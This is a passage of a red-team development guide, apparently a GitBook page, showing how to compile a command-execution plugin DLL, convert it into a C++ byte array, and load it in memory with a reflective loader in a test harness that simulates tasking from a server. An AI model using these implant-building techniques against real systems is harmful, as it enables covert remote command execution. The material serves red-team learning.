class="highlight-line-content">cl.exe /W0 /D_USRDLL /D_WINDLL *.cpp /MT /link /DLL /OUT:cmdplugin.dll</span></span></code></pre></div><!--/$--><hr class="mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 page-width-wide:max-w-full border-tint-subtle"><h3 id="embedding-a-dll-as-bytes-for-testing" class="text-lg @xs:text-xl @lg:text-2xl font-semibold heading flex items-baseline scroll-mt-(--content-scroll-margin) text-start self-start justify-start relative group/hash mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 column-first-of-type:pt-0 pt-[0.75em]"><div class="relative hash grid grid-area-1-1 h-[1em] border-0 opacity-0 site-background rounded group-hover/hash:opacity-[0] group-focus/hash:opacity-[0] md:group-hover/hash:opacity-[1] md:group-focus/hash:opacity-[1] -ml-6 pr-2 [.flip-heading-hash_&amp;]:order-last [.flip-heading-hash_&amp;]:ml-1 [.flip-heading-hash_&amp;]:pl-2"><a class="inline-flex h-full items-start leading-snug" aria-label="Direct link to heading" href="https://racoten.gitbook.io/red-team-developments-and-operations#embedding-a-dll-as-bytes-for-testing"><svg class="gb-icon self-center transition-colors text-transparent group-hover/hash:text-tint-subtle contrast-more:group-hover/hash:text-tint-strong size-4"><title>hashtag</title><defs><mask id="_R_cr8qav5ukqiv5ubsnpfivb_" style="mask-type:alpha"><image data-testid="mask-image" href="https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/hashtag.svg?v=2&amp;token=a463935e93" width="100%" height="100%" preserveAspectRatio="xMidYMid meet"></image></mask></defs><rect width="100%" height="100%" fill="currentColor" mask="url(#_R_cr8qav5ukqiv5ubsnpfivb_)"></rect></svg></a></div><div class="flex-1 z-1 justify-self-start max-w-full break-words text-start self-start justify-start leading-snug">Embedding a DLL as Bytes (for Testing)</div></h3><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">I keep a tiny script around that turns a compiled DLL into a C/C++ byte array for fast experiments:</p><!--$--><div aria-busy="false" class="group/codeblock shiki grid shrink grid-flow-col overflow-hidden mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-width-wide:max-w-full page-api-block:ml-0" data-color-scheme="light dark"><div class="flex items-center justify-start gap-2 text-sm [grid-area:1/1]"></div><button type="button" class="button group/button inline-flex items-center gap-2 rounded-xl straight-corners:rounded-none circular-corners:rounded-3xl border border-tint hover:border-tint-hover disabled:border-tint depth-subtle:shadow-xs hover:depth-subtle:shadow-md focus-visible:depth-subtle:shadow-md active:depth-subtle:shadow-xs shadow-tint/6 dark:shadow-tint-1 not-focus-visible:outline-0 contrast-more:border-tint-12 contrast-more:hover:outline-2 contrast-more:hover:outline-tint-12 contrast-more:hover:border-tint-12 contrast-more:focus-visible:border-tint-12 contrast-more:focus-visible:outline-tint-12 hover:depth-subtle:-translate-y-px focus-visible:depth-subtle:-translate-y-px data-[state=open]:depth-subtle:-translate-y-px active:depth-subtle:translate-y-0 transition-all grow-0 shrink-0 truncate max-w-full align-middle disabled:cursor-not-allowed disabled:translate-y-0! disabled:shadow-none! bg-tint depth-flat:bg-transparent text-tint hover:bg-tint-hover hover:not-disabled:depth-flat:bg-tint-hover hover:not-disabled:text-tint contrast-more:bg-tint-subtle disabled:bg-transparent disabled:text-tint/8 p-1 text-sm/tight rounded-corners:rounded-lg px-2 z-2 mt-2 mr-2 self-start justify-self-end leading-none opacity-0 backdrop-blur-md [grid-area:2/1] group-hover/codeblock:opacity-11 translate-y-0! print:hidden"><span class="button-content truncate">Copy</span></button><pre class="relative overflow-auto border border-tint-subtle bg-tint-subtle theme-bold-tint:bg-tint-base theme-muted:bg-tint-base p-2 text-tint-strong [grid-area:2/1] contrast-more:border-tint contrast-more:bg-tint-base circular-corners:rounded-2xl rounded-corners:rounded-xl straight-corners:rounded-xs depth-subtle:shadow-xs"><code id="_R_4v8qav5ukqiv5ubsnpfivb_" class="inline-grid max-h-full min-w-full grid-cols-[auto_1fr] [count-reset:line] print:whitespace-pre-wrap [[aria-expanded=false]_&amp;]:mask-b-from-50%"><span class="highlight-line"><span class="highlight-line-content">import sys<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">import os<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">from textwrap import wrap<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">  <!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">def file_to_cpp_hex_array(filename, var_name="embeddedBytes", bytes_per_line=16):<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; try:<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; with open(filename, "rb") as f:<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; data = f.read()<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; except Exception as e:<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; print(f"Failed to read file: {e}")<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; return<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">  <!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; size = len(data)<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; hex_lines = []<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; for line in wrap(data.hex(), bytes_per_line * 2): &nbsp;# 2 hex chars per byte<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; hex_bytes = ", ".join(f"0x{line[i:i+2]}" for i in range(0, len(line), 2))<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; hex_lines.append(f" &nbsp; &nbsp;{hex_bytes},")<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; cpp_code = f"""\<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">#include &lt;cstdint&gt;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">  <!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">constexpr std::size_t {var_name}_size = {size};<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">  <!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">const uint8_t {var_name}[] = {{<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">{os.linesep.join(hex_lines)}<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">}};<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">"""<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; print(cpp_code)<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">  <!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">if __name__ == "__main__":<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; if len(sys.argv) &lt; 2:<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; print("Usage: python3 file2hex.py &lt;filename&gt; [var_name]")<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; else:<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; file_to_cpp_hex_array(<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; filename=sys.argv[1],<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; var_name=sys.argv[2] if len(sys.argv) &gt;= 3 else "embeddedBytes"<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; )</span></span></code></pre></div><!--/$--><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">Executing this script with the output piped to <code class="py-px px-1.5 min-w-6.5 justify-center items-center ring-1 ring-inset ring-tint bg-tint rounded-sm text-[.875em] leading-[calc(max(1.20em,1.25rem))]">clip</code>:</p><!--$--><div aria-busy="false" class="group/codeblock shiki grid shrink grid-flow-col overflow-hidden mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-width-wide:max-w-full page-api-block:ml-0" data-color-scheme="light dark"><div class="flex items-center justify-start gap-2 text-sm [grid-area:1/1]"></div><button type="button" class="button group/button inline-flex items-center gap-2 rounded-xl straight-corners:rounded-none circular-corners:rounded-3xl border border-tint hover:border-tint-hover disabled:border-tint depth-subtle:shadow-xs hover:depth-subtle:shadow-md focus-visible:depth-subtle:shadow-md active:depth-subtle:shadow-xs shadow-tint/6 dark:shadow-tint-1 not-focus-visible:outline-0 contrast-more:border-tint-12 contrast-more:hover:outline-2 contrast-more:hover:outline-tint-12 contrast-more:hover:border-tint-12 contrast-more:focus-visible:border-tint-12 contrast-more:focus-visible:outline-tint-12 hover:depth-subtle:-translate-y-px focus-visible:depth-subtle:-translate-y-px data-[state=open]:depth-subtle:-translate-y-px active:depth-subtle:translate-y-0 transition-all grow-0 shrink-0 truncate max-w-full align-middle disabled:cursor-not-allowed disabled:translate-y-0! disabled:shadow-none! bg-tint depth-flat:bg-transparent text-tint hover:bg-tint-hover hover:not-disabled:depth-flat:bg-tint-hover hover:not-disabled:text-tint contrast-more:bg-tint-subtle disabled:bg-transparent disabled:text-tint/8 p-1 text-sm/tight rounded-corners:rounded-lg px-2 z-2 mt-2 mr-2 self-start justify-self-end leading-none opacity-0 backdrop-blur-md [grid-area:2/1] group-hover/codeblock:opacity-11 translate-y-0! print:hidden"><span class="button-content truncate">Copy</span></button><pre class="relative overflow-auto border border-tint-subtle bg-tint-subtle theme-bold-tint:bg-tint-base theme-muted:bg-tint-base p-2 text-tint-strong [grid-area:2/1] contrast-more:border-tint contrast-more:bg-tint-base circular-corners:rounded-2xl rounded-corners:rounded-xl straight-corners:rounded-xs depth-subtle:shadow-xs"><code id="_R_538qav5ukqiv5ubsnpfivb_" class="inline-grid max-h-full min-w-full grid-cols-[auto_1fr] [count-reset:line] print:whitespace-pre-wrap [[aria-expanded=false]_&amp;]:mask-b-from-50%"><span class="highlight-line"><span class="highlight-line-content">python .\file2hex.py .\cmdplugin.dll cmd_dll | clip</span></span></code></pre></div><!--/$--><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">Yields the following to your clipboard which you can save in <code class="py-px px-1.5 min-w-6.5 justify-center items-center ring-1 ring-inset ring-tint bg-tint rounded-sm text-[.875em] leading-[calc(max(1.20em,1.25rem))]">TestDll.h</code>:</p><!--$--><div aria-busy="false" class="group/codeblock shiki grid shrink grid-flow-col overflow-hidden mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-width-wide:max-w-full page-api-block:ml-0" data-color-scheme="light dark"><div class="flex items-center justify-start gap-2 text-sm [grid-area:1/1]"></div><button type="button" class="button group/button inline-flex items-center gap-2 rounded-xl straight-corners:rounded-none circular-corners:rounded-3xl border border-tint hover:border-tint-hover disabled:border-tint depth-subtle:shadow-xs hover:depth-subtle:shadow-md focus-visible:depth-subtle:shadow-md active:depth-subtle:shadow-xs shadow-tint/6 dark:shadow-tint-1 not-focus-visible:outline-0 contrast-more:border-tint-12 contrast-more:hover:outline-2 contrast-more:hover:outline-tint-12 contrast-more:hover:border-tint-12 contrast-more:focus-visible:border-tint-12 contrast-more:focus-visible:outline-tint-12 hover:depth-subtle:-translate-y-px focus-visible:depth-subtle:-translate-y-px data-[state=open]:depth-subtle:-translate-y-px active:depth-subtle:translate-y-0 transition-all grow-0 shrink-0 truncate max-w-full align-middle disabled:cursor-not-allowed disabled:translate-y-0! disabled:shadow-none! bg-tint depth-flat:bg-transparent text-tint hover:bg-tint-hover hover:not-disabled:depth-flat:bg-tint-hover hover:not-disabled:text-tint contrast-more:bg-tint-subtle disabled:bg-transparent disabled:text-tint/8 p-1 text-sm/tight rounded-corners:rounded-lg px-2 z-2 mt-2 mr-2 self-start justify-self-end leading-none opacity-0 backdrop-blur-md [grid-area:2/1] group-hover/codeblock:opacity-11 translate-y-0! print:hidden"><span class="button-content truncate">Copy</span></button><pre class="relative overflow-auto border border-tint-subtle bg-tint-subtle theme-bold-tint:bg-tint-base theme-muted:bg-tint-base p-2 text-tint-strong [grid-area:2/1] contrast-more:border-tint contrast-more:bg-tint-base circular-corners:rounded-2xl rounded-corners:rounded-xl straight-corners:rounded-xs depth-subtle:shadow-xs"><code id="_R_578qav5ukqiv5ubsnpfivb_" class="inline-grid max-h-full min-w-full grid-cols-[auto_1fr] [count-reset:line] print:whitespace-pre-wrap [[aria-expanded=false]_&amp;]:mask-b-from-50%"><span class="highlight-line"><span class="highlight-line-content">#include &lt;cstdint&gt;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">
</span></span><span class="highlight-line"><span class="highlight-line-content">constexpr std::size_t cmd_dll_size = 105472;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">
</span></span><span class="highlight-line"><span class="highlight-line-content">const uint8_t cmd_dll[] = {<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">    0x4d, 0x5a, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0xff, 0xff, 0x00, 0x00,<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">
</span></span><span class="highlight-line"><span class="highlight-line-content">    0xb8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">    ...<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">    ...<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">};</span></span></code></pre></div><!--/$--><hr class="mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 page-width-wide:max-w-full border-tint-subtle"><h3 id="host-test-harness" class="text-lg @xs:text-xl @lg:text-2xl font-semibold heading flex items-baseline scroll-mt-(--content-scroll-margin) text-start self-start justify-start relative group/hash mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 column-first-of-type:pt-0 pt-[0.75em]"><div class="relative hash grid grid-area-1-1 h-[1em] border-0 opacity-0 site-background rounded group-hover/hash:opacity-[0] group-focus/hash:opacity-[0] md:group-hover/hash:opacity-[1] md:group-focus/hash:opacity-[1] -ml-6 pr-2 [.flip-heading-hash_&amp;]:order-last [.flip-heading-hash_&amp;]:ml-1 [.flip-heading-hash_&amp;]:pl-2"><a class="inline-flex h-full items-start leading-snug" aria-label="Direct link to heading" href="https://racoten.gitbook.io/red-team-developments-and-operations#host-test-harness"><svg class="gb-icon self-center transition-colors text-transparent group-hover/hash:text-tint-subtle contrast-more:group-hover/hash:text-tint-strong size-4"><title>hashtag</title><defs><mask id="_R_db8qav5ukqiv5ubsnpfivb_" style="mask-type:alpha"><image data-testid="mask-image" href="https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/hashtag.svg?v=2&amp;token=a463935e93" width="100%" height="100%" preserveAspectRatio="xMidYMid meet"></image></mask></defs><rect width="100%" height="100%" fill="currentColor" mask="url(#_R_db8qav5ukqiv5ubsnpfivb_)"></rect></svg></a></div><div class="flex-1 z-1 justify-self-start max-w-full break-words text-start self-start justify-start leading-snug">Host Test Harness</div></h3><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">A simple harness maps the module once, resolves exports, constructs the plugin, and dispatches a test task.</p><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">Watch out though, the variable does contain 13000+ lines.</p><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">We plug this in to our test reflective loader and we proceed to test it! We will be using the following to execute our command:</p><!--$--><div aria-busy="false" class="group/codeblock shiki grid shrink grid-flow-col overflow-hidden mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-width-wide:max-w-full page-api-block:ml-0" data-color-scheme="light dark"><div class="flex items-center justify-start gap-2 text-sm [grid-area:1/1]"></div><button type="button" class="button group/button inline-flex items-center gap-2 rounded-xl straight-corners:rounded-none circular-corners:rounded-3xl border border-tint hover:border-tint-hover disabled:border-tint depth-subtle:shadow-xs hover:depth-subtle:shadow-md focus-visible:depth-subtle:shadow-md active:depth-subtle:shadow-xs shadow-tint/6 dark:shadow-tint-1 not-focus-visible:outline-0 contrast-more:border-tint-12 contrast-more:hover:outline-2 contrast-more:hover:outline-tint-12 contrast-more:hover:border-tint-12 contrast-more:focus-visible:border-tint-12 contrast-more:focus-visible:outline-tint-12 hover:depth-subtle:-translate-y-px focus-visible:depth-subtle:-translate-y-px data-[state=open]:depth-subtle:-translate-y-px active:depth-subtle:translate-y-0 transition-all grow-0 shrink-0 truncate max-w-full align-middle disabled:cursor-not-allowed disabled:translate-y-0! disabled:shadow-none! bg-tint depth-flat:bg-transparent text-tint hover:bg-tint-hover hover:not-disabled:depth-flat:bg-tint-hover hover:not-disabled:text-tint contrast-more:bg-tint-subtle disabled:bg-transparent disabled:text-tint/8 p-1 text-sm/tight rounded-corners:rounded-lg px-2 z-2 mt-2 mr-2 self-start justify-self-end leading-none opacity-0 backdrop-blur-md [grid-area:2/1] group-hover/codeblock:opacity-11 translate-y-0! print:hidden"><span class="button-content truncate">Copy</span></button><pre class="relative overflow-auto border border-tint-subtle bg-tint-subtle theme-bold-tint:bg-tint-base theme-muted:bg-tint-base p-2 text-tint-strong [grid-area:2/1] contrast-more:border-tint contrast-more:bg-tint-base circular-corners:rounded-2xl rounded-corners:rounded-xl straight-corners:rounded-xs depth-subtle:shadow-xs"><code id="_R_5j8qav5ukqiv5ubsnpfivb_" class="inline-grid max-h-full min-w-full grid-cols-[auto_1fr] [count-reset:line] print:whitespace-pre-wrap [[aria-expanded=false]_&amp;]:mask-b-from-50%"><span class="highlight-line"><span class="highlight-line-content">#include &lt;iostream&gt;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">
</span></span><span class="highlight-line"><span class="highlight-line-content">#include "IPlugin.h"<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">#include "TestDll.h"<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">#include "ReflectiveLoaderEngine.h"<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">
</span></span><span class="highlight-line"><span class="highlight-line-content">using CreatePlugin_t = IPlugin * (__stdcall*)();<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">using DestroyPlugin_t = void(__stdcall*)(IPlugin*);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">using PluginInit_t = void(__stdcall*)(IPlugin*);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">using PluginExec_t = void(__stdcall*)(const TaskApi*);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">using PluginCleanup_t = void(__stdcall*)(IPlugin*);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">
</span></span><span class="highlight-line"><span class="highlight-line-content">void Test_Extension_CMD(const char* cmd) {<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">    MemModule mod = MapImage(cmd_dll, cmd_dll_size);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">    if (!mod.base) { std::cerr &lt;&lt; "[-] map failed\n"; return; }<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">
</span></span><span class="highlight-line"><span class="highlight-line-content">    auto create_plugin = (CreatePlugin_t)GetExport(mod, "create_plugin");<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">    auto destroy_plugin = (DestroyPlugin_t)GetExport(mod, "destroy_plugin");<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">    auto plugin_init = (PluginInit_t)GetExport(mod, "plugin_init");<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">    auto plugin_exec = (PluginExec_t)GetExport(mod, "plugin_exec");<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">    auto plugin_cleanup = (PluginCleanup_t)GetExport(mod, "plugin_cleanup");<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">
</span></span><span class="highlight-line"><span class="highlight-line-content">    if (!create_plugin || !destroy_plugin || !plugin_init || !plugin_exec || !plugin_cleanup) {<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">        std::cerr &lt;&lt; "[-] missing one or more exports\n"; return;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">    }<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">
</span></span><span class="highlight-line"><span class="highlight-line-content">    IPlugin* plugin = create_plugin();<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">    if (!plugin) { std::cerr &lt;&lt; "[-] create_plugin returned null\n"; return; }<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">
</span></span><span class="highlight-line"><span class="highlight-line-content">    plugin_init(plugin);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">
</span></span><span class="highlight-line"><span class="highlight-line-content">    TaskApi task{};<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">    task.TaskId = "local-test";   task.TaskIdLen = (DWORD)lstrlenA(task.TaskId);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">    task.Instruction = "exec";         task.InstructionLen = (DWORD)lstrlenA(task.Instruction);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">    task.Command = cmd;            task.CommandLen = (cmd ? (DWORD)lstrlenA(cmd) : 0);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">
</span></span><span class="highlight-line"><span class="highlight-line-content">    plugin_exec(&amp;task);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">    plugin_cleanup(plugin);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">    destroy_plugin(plugin);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">}<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">
</span></span><span class="highlight-line"><span class="highlight-line-content">void main() {<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">    // This is simulating an instruction received by your server.<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">    // Assume the command is "dir"<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">    TaskApi* task = new TaskApi;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">    task-&gt;Command = "dir";<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">    Test_Extension_CMD(task-&gt;Command);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">}</span></span></code></pre></div><!--/$--><div class="mx-auto page-width-wide:mx-0 decoration-primary/6 max-w-3xl print:break-inside-avoid page-width-wide:max-w-full page-api-block:ml-0 flex w-full justify-center"><div class="flex flex-row gap-3"><div class="relative overflow-hidden"><div class="relative overflow-hidden after:block after:absolute after:-inset-0 after:pointer-events-none w-fit"><img data-testid="zoom-image" alt="" style="max-width:100%;height:auto" loading="lazy" class="block" src="https://racoten.gitbook.io/red-team-developments-and-operations/~gitbook/image?url=https%3A%2F%2F635941030-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FUjs53gB96valSUAXKAm1%252Fuploads%252FpTckEehWRzrFF7Bwi03M%252FPasted%2520image%252020250918130729.png%3Falt%3Dmedia%26token%3Dd9ad9094-9042-4618-b8f4-ba53fbeee0d5&amp;width=768&amp;dpr=3&amp;quality=100&amp;sign=2c1f4ed5&amp;sv=2" width="1678" height="802"></div></div></div></div><h3 id="checklist-for-the-harness" class="text-lg @xs:text-xl @lg:text-2xl font-semibold heading flex items-baseline scroll-mt-(--content-scroll-margin) text-start self-start justify-start relative group/hash mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 column-first-of-type:pt-0 pt-[0.75em]"><div class="relative hash grid grid-area-1-1 h-[1em] border-0 opacity-0 site-background rounded group-hover/hash:opacity-[0] group-focus/hash:opacity-[0] md:group-hover/hash:opacity-[1] md:group-focus/hash:opacity-[1] -ml-6 pr-2 [.flip-heading-hash_&amp;]:order-last [.flip-heading-hash_&amp;]:ml-1 [.flip-heading-hash_&amp;]:pl-2"><a class="inline-flex h-full items-start leading-snug" aria-label="Direct link to heading" href="https://racoten.gitbook.io/red-team-developments-and-operations#checklist-for-the-harness"><svg class="gb-icon self-center transition-colors text-transparent group-hover/hash:text-tint-subtle contrast-more:group-hover/hash:text-tint-strong size-4"><title>hashtag</title><defs><mask id="_R_dn8qav5ukqiv5ubsnpfivb_" style="mask-type:alpha"><image data-testid="mask-image" href="https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/hashtag.svg?v=2&amp;token=a463935e93" width="100%" height="100%" preserveAspectRatio="xMidYMid meet"></image></mask></defs><rect width="100%" height="100%" fill="currentColor" mask="url(#_R_dn8qav5ukqiv5ubsnpfivb_)"></rect></svg></a></div><div class="flex-1 z-1 justify-self-start max-w-full break-words text-start self-start justify-start leading-snug">Checklist for the harness:</div></h3><ul class="min-w-0 space-y-2 mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl page-api-block:ml-0"><li class="leading-normal flex items-start"><div class="text-base leading-normal mr-1 flex min-h-lh min-w-6 items-center justify-center text-tint"><div class="before:font-var before:content-(--pseudoBefore--content)" style="--pseudoBefore--content:'•';--font-family:Arial;font-size:min(1.5em, 24px);line-height:1"></div></div><div class="flex min-w-0 flex-1 flex-col space-y-2"><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid min-h-lh [h2]:pt-0 [h3]:pt-0 [h4]:pt-0 mx-0 text-start self-start justify-start">Map <strong class="font-bold">once</strong> and resolve all exports from <strong class="font-bold">that same</strong> mapped base.</p></div></li><li class="leading-normal flex items-start"><div class="text-base leading-normal mr-1 flex min-h-lh min-w-6 items-center justify-center text-tint"><div class="before:font-var before:content-(--pseudoBefore--content)" style="--pseudoBefore--content:'•';--font-family:Arial;font-size:min(1.5em, 24px);line-height:1"></div></div><div class="flex min-w-0 flex-1 flex-col space-y-2"><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid min-h-lh [h2]:pt-0 [h3]:pt-0 [h4]:pt-0 mx-0 text-start self-start justify-start">Create/destroy via the exported functions (don’t mix in <code class="py-px px-1.5 min-w-6.5 justify-center items-center ring-1 ring-inset ring-tint bg-tint rounded-sm text-[.875em] leading-[calc(max(1.20em,1.25rem))]">delete</code>).</p></div></li><li class="leading-normal flex items-start"><div class="text-base leading-normal mr-1 flex min-h-lh min-w-6 items-center justify-center text-tint"><div class="before:font-var before:content-(--pseudoBefore--content)" style="--pseudoBefore--content:'•';--font-family:Arial;font-size:min(1.5em, 24px);line-height:1"></div></div><div class="flex min-w-0 flex-1 flex-col space-y-2"><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid min-h-lh [h2]:pt-0 [h3]:pt-0 [h4]:pt-0 mx-0 text-start self-start justify-start">Pass a fully populated <code class="py-px px-1.5 min-w-6.5 justify-center items-center ring-1 ring-inset ring-tint bg-tint rounded-sm text-[.875em] leading-[calc(max(1.20em,1.25rem))]">TaskApi*</code> (use <code class="py-px px-1.5 min-w-6.5 justify-center items-center ring-1 ring-inset ring-tint bg-tint rounded-sm text-[.875em] leading-[calc(max(1.20em,1.25rem))]">null+0</code> for absent fields).<!-- --></p></div></li><li class="leading-normal flex items-start"><div class="text-base 